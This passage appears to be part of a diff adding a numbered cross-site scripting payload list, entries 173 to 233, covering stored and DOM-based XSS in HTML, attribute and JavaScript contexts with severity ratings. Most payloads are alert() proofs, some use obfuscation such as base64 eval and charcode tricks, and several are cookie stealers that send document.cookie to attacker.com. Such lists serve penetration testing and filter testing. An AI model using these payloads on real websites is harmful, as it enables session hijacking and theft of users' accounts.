+--------------------------------------------------------------------------------
+
+[173] STORED XSS - HTML Context
+Severity   : High
+Description: SVG stored XSS
+Payload    : <svg onload=alert('Stored XSS')>
+--------------------------------------------------------------------------------
+
+[174] STORED XSS - HTML Context
+Severity   : High
+Description: Iframe stored XSS
+Payload    : <iframe src=javascript:alert('Stored')>
+--------------------------------------------------------------------------------
+
+[175] STORED XSS - HTML Context
+Severity   : High
+Description: Basic stored script
+Payload    : <script>alert('Stored')</script>
+--------------------------------------------------------------------------------
+
+[176] STORED XSS - HTML Context
+Severity   : Medium
+Description: Body onload stored
+Payload    : <body onload=alert('Stored')>
+--------------------------------------------------------------------------------
+
+[177] STORED XSS - HTML Context
+Severity   : High
+Description: Input stored XSS
+Payload    : <input onfocus=alert('Stored') autofocus>
+--------------------------------------------------------------------------------
+
+[178] STORED XSS - HTML Context
+Severity   : Low
+Description: Marquee stored XSS
+Payload    : <marquee onstart=alert('Stored')>
+--------------------------------------------------------------------------------
+
+[179] STORED XSS - HTML Context
+Severity   : Medium
+Description: Details stored XSS
+Payload    : <details open ontoggle=alert('Stored')>
+--------------------------------------------------------------------------------
+
+[180] STORED XSS - HTML Context
+Severity   : Medium
+Description: Video stored XSS
+Payload    : <video src=x onerror=alert('Stored')>
+--------------------------------------------------------------------------------
+
+[181] STORED XSS - HTML Context
+Severity   : Medium
+Description: Audio stored XSS
+Payload    : <audio src=x onerror=alert('Stored')>
+--------------------------------------------------------------------------------
+
+[182] STORED XSS - HTML Context
+Severity   : Medium
+Description: Select stored XSS
+Payload    : <select onfocus=alert('Stored') autofocus>
+--------------------------------------------------------------------------------
+
+[183] STORED XSS - HTML Context
+Severity   : Medium
+Description: Textarea stored XSS
+Payload    : <textarea onfocus=alert('Stored') autofocus>
+--------------------------------------------------------------------------------
+
+[184] STORED XSS - HTML Context
+Severity   : High
+Description: Object stored XSS
+Payload    : <object data=javascript:alert('Stored')>
+--------------------------------------------------------------------------------
+
+[185] STORED XSS - HTML Context
+Severity   : High
+Description: Embed stored XSS
+Payload    : <embed src=javascript:alert('Stored')>
+--------------------------------------------------------------------------------
+
+[186] STORED XSS - HTML Context
+Severity   : Medium
+Description: Button stored XSS
+Payload    : <button onclick=alert('Stored')>Click</button>
+--------------------------------------------------------------------------------
+
+[187] STORED XSS - HTML Context
+Severity   : High
+Description: Form stored XSS
+Payload    : <form action=javascript:alert('Stored')><input type=submit>
+--------------------------------------------------------------------------------
+
+[188] STORED XSS - HTML Context
+Severity   : Medium
+Description: Link CSS stored
+Payload    : <link rel=stylesheet href=data:,*%7Bx:expression(alert('Stored'))%7D>
+--------------------------------------------------------------------------------
+
+[189] STORED XSS - HTML Context
+Severity   : High
+Description: Base tag stored
+Payload    : <base href=javascript:alert('Stored')//>
+--------------------------------------------------------------------------------
+
+[190] STORED XSS - ATTRIBUTE Context
+Severity   : Critical
+Description: Attribute-based cookie stealer
+Payload    : " onfocus="fetch('http://attacker.com?c='+document.cookie)" autofocus="
+--------------------------------------------------------------------------------
+
+[191] STORED XSS - ATTRIBUTE Context
+Severity   : Critical
+Description: Break out and steal cookie
+Payload    : "><img src=x onerror="location='http://attacker.com?c='+document.cookie">
+--------------------------------------------------------------------------------
+
+[192] STORED XSS - ATTRIBUTE Context
+Severity   : High
+Description: Stored onclick handler
+Payload    : " onclick="alert('Stored XSS')
+--------------------------------------------------------------------------------
+
+[193] STORED XSS - ATTRIBUTE Context
+Severity   : High
+Description: Stored onload handler
+Payload    : " onload="alert('Stored')
+--------------------------------------------------------------------------------
+
+[194] STORED XSS - ATTRIBUTE Context
+Severity   : High
+Description: Stored onerror handler
+Payload    : " onerror="alert('Stored')
+--------------------------------------------------------------------------------
+
+[195] STORED XSS - ATTRIBUTE Context
+Severity   : Medium
+Description: Stored onmouseover
+Payload    : " onmouseover="alert('Stored')
+--------------------------------------------------------------------------------
+
+[196] STORED XSS - ATTRIBUTE Context
+Severity   : High
+Description: Single quote stored onclick
+Payload    : ' onclick='alert("Stored")'
+--------------------------------------------------------------------------------
+
+[197] STORED XSS - ATTRIBUTE Context
+Severity   : High
+Description: Single quote tag injection
+Payload    : '><script>alert("Stored")</script>
+--------------------------------------------------------------------------------
+
+[198] STORED XSS - ATTRIBUTE Context
+Severity   : High
+Description: Autofocus attribute attack
+Payload    : " autofocus onfocus="alert(1)
+--------------------------------------------------------------------------------
+
+[199] STORED XSS - ATTRIBUTE Context
+Severity   : Medium
+Description: CSS expression attack
+Payload    : " style="x:expression(alert(1))"
+--------------------------------------------------------------------------------
+
+[200] STORED XSS - JAVASCRIPT Context
+Severity   : Critical
+Description: JS context cookie stealer
+Payload    : '; fetch('http://attacker.com?c='+document.cookie); //
+--------------------------------------------------------------------------------
+
+[201] STORED XSS - JAVASCRIPT Context
+Severity   : High
+Description: JS context redirect
+Payload    : "; window.location="http://attacker.com"; //
+--------------------------------------------------------------------------------
+
+[202] STORED XSS - JAVASCRIPT Context
+Severity   : High
+Description: Document.write injection
+Payload    : ';document.write('<img src=x onerror=alert(1)>');//
+--------------------------------------------------------------------------------
+
+[203] STORED XSS - JAVASCRIPT Context
+Severity   : High
+Description: Base64 eval injection
+Payload    : ';eval(atob('YWxlcnQoMSk='));//
+--------------------------------------------------------------------------------
+
+[204] STORED XSS - JAVASCRIPT Context
+Severity   : High
+Description: SetTimeout stored
+Payload    : ';setTimeout(alert(1),0);//
+--------------------------------------------------------------------------------
+
+[205] STORED XSS - JAVASCRIPT Context
+Severity   : High
+Description: Function constructor
+Payload    : ';Function('alert(1)')();//
+--------------------------------------------------------------------------------
+
+[206] STORED XSS - JAVASCRIPT Context
+Severity   : High
+Description: Unicode escape
+Payload    : ';\u0061lert(1);//
+--------------------------------------------------------------------------------
+
+[207] STORED XSS - JAVASCRIPT Context
+Severity   : High
+Description: CharCode stored
+Payload    : ';alert(String.fromCharCode(88,83,83));//
+--------------------------------------------------------------------------------
+
+[208] DOM XSS - HTML Context
+Severity   : High
+Description: DOM-based XSS showing domain
+Payload    : <img src=x onerror=alert(document.domain)>
+--------------------------------------------------------------------------------
+
+[209] DOM XSS - HTML Context
+Severity   : High
+Description: Hash fragment injection
+Payload    : #<script>alert('DOM XSS')</script>
+--------------------------------------------------------------------------------
+
+[210] DOM XSS - HTML Context
+Severity   : Medium
+Description: Show current location
+Payload    : <svg onload=alert(window.location)>
+--------------------------------------------------------------------------------
+
+[211] DOM XSS - HTML Context
+Severity   : Medium
+Description: Display document URL
+Payload    : <img src=x onerror=alert(document.URL)>
+--------------------------------------------------------------------------------
+
+[212] DOM XSS - HTML Context
+Severity   : High
+Description: Break out for DOM manipulation
+Payload    : "><svg onload=alert(1)>
+--------------------------------------------------------------------------------
+
+[213] DOM XSS - HTML Context
+Severity   : Medium
+Description: Display referrer
+Payload    : <img src=x onerror=alert(document.referrer)>
+--------------------------------------------------------------------------------
+
+[214] DOM XSS - HTML Context
+Severity   : Medium
+Description: Display hash
+Payload    : <img src=x onerror=alert(location.hash)>
+--------------------------------------------------------------------------------
+
+[215] DOM XSS - HTML Context
+Severity   : Medium
+Description: Display search params
+Payload    : <img src=x onerror=alert(location.search)>
+--------------------------------------------------------------------------------
+
+[216] DOM XSS - HTML Context
+Severity   : Medium
+Description: Display base URI
+Payload    : <img src=x onerror=alert(document.baseURI)>
+--------------------------------------------------------------------------------
+
+[217] DOM XSS - HTML Context
+Severity   : High
+Description: Alert href
+Payload    : <script>alert(location.href)</script>
+--------------------------------------------------------------------------------
+
+[218] DOM XSS - HTML Context
+Severity   : High
+Description: Alert document URI
+Payload    : <script>alert(document.documentURI)</script>
+--------------------------------------------------------------------------------
+
+[219] DOM XSS - HTML Context
+Severity   : High
+Description: Parent domain access
+Payload    : <iframe src=javascript:alert(parent.document.domain)>
+--------------------------------------------------------------------------------
+
+[220] DOM XSS - HTML Context
+Severity   : Critical
+Description: Eval from hash
+Payload    : <img src=x onerror=eval(location.hash.slice(1))>
+--------------------------------------------------------------------------------
+
+[221] DOM XSS - HTML Context
+Severity   : Critical
+Description: Base64 hash eval
+Payload    : <img src=x onerror=eval(atob(location.hash.slice(1)))>
+--------------------------------------------------------------------------------
+
+[222] DOM XSS - HTML Context
+Severity   : High
+Description: Write hash to document
+Payload    : <img src=x onerror=document.write(location.hash)>
+--------------------------------------------------------------------------------
+
+[223] DOM XSS - ATTRIBUTE Context
+Severity   : High
+Description: DOM attribute injection
+Payload    : " onload="alert(document.domain)
+--------------------------------------------------------------------------------
+
+[224] DOM XSS - ATTRIBUTE Context
+Severity   : High
+Description: DOM-based attribute XSS
+Payload    : " onfocus="alert(document.URL)" autofocus="
+--------------------------------------------------------------------------------
+
+[225] DOM XSS - ATTRIBUTE Context
+Severity   : High
+Description: DOM onclick href
+Payload    : " onclick="alert(location.href)
+--------------------------------------------------------------------------------
+
+[226] DOM XSS - ATTRIBUTE Context
+Severity   : High
+Description: DOM onerror hash
+Payload    : " onerror="alert(location.hash)
+--------------------------------------------------------------------------------
+
+[227] DOM XSS - ATTRIBUTE Context
+Severity   : High
+Description: Single quote DOM attack
+Payload    : 'onclick='alert(document.domain)'
+--------------------------------------------------------------------------------
+
+[228] DOM XSS - ATTRIBUTE Context
+Severity   : High
+Description: DOM image injection
+Payload    : "><img src=x onerror=alert(document.URL)>
+--------------------------------------------------------------------------------
+
+[229] DOM XSS - JAVASCRIPT Context
+Severity   : High
+Description: JavaScript protocol handler
+Payload    : javascript:alert(document.domain)
+--------------------------------------------------------------------------------
+
+[230] DOM XSS - JAVASCRIPT Context
+Severity   : Critical
+Description: JavaScript protocol cookie access
+Payload    : javascript:alert(document.cookie)
+--------------------------------------------------------------------------------
+
+[231] DOM XSS - JAVASCRIPT Context
+Severity   : High
+Description: JavaScript protocol href
+Payload    : javascript:alert(location.href)
+--------------------------------------------------------------------------------
+
+[232] DOM XSS - JAVASCRIPT Context
+Severity   : High
+Description: JavaScript void function
+Payload    : javascript:void(alert(document.domain))
+--------------------------------------------------------------------------------
+
+[233] DOM XSS - JAVASCRIPT Context
+Severity   : High
+Description: Data URI DOM access
+Payload    : data:text/html,<script>alert(parent.document.domain)</script>
+--------------------------------------------------------------------------------
+
